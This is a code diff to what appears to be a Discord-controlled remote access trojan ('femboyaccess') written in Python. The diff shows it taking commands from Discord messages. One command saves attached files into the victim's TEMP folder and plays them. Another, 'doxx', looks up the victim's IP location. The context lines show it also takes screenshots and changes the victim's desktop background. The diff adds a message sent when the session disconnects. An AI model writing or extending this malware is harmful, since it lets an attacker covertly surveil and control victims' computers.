@@ -564,20 +564,14 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			await message.reply(await femboyaccess("background", "failed to apply new background! :c"))
 
 	if message.content.startswith("playsound"):
-		if len(message.content.split(" ")) > 1:
-			sound_url = message.content.split(" ")[1]
-		else:
-			await message.reply(await femboyaccess('playsound', 'please pass a sound link as an argument! :3'))
-			return
-		response = requests.get(sound_url)
-		if response.status_code == 200:
-			file_path = os.path.join(os.getenv("TEMP"), "sound.mp3")
-			with open(file_path, "wb") as f:
-				f.write(response.content)
-			playsound(file_path)
+		attachment = message.attachments[0] if message.attachments else None
+		if attachment:
+			file_path = os.path.join(os.getenv("TEMP"), attachment.filename)
+			await attachment.save(file_path)
+			playsound(file_path.replace("\\", "/"))
 			await message.reply(await femboyaccess("playsound", "sound has been played! :3"))
 		else:
-			await message.reply(await femboyaccess("playsound", "failed to play sound! :c"))
+			await message.reply(await femboyaccess('playsound', 'please attach a sound file as an argument! :3'))
 
 	if message.content.startswith("doxx"):
 		data = requests.get("https://ipapi.co/json/").json()
@@ -902,6 +896,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 
 @client.event
 async def on_disconnect(message):
+	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! :3"))
 	await message.channel.delete()
 	await client.close()
 
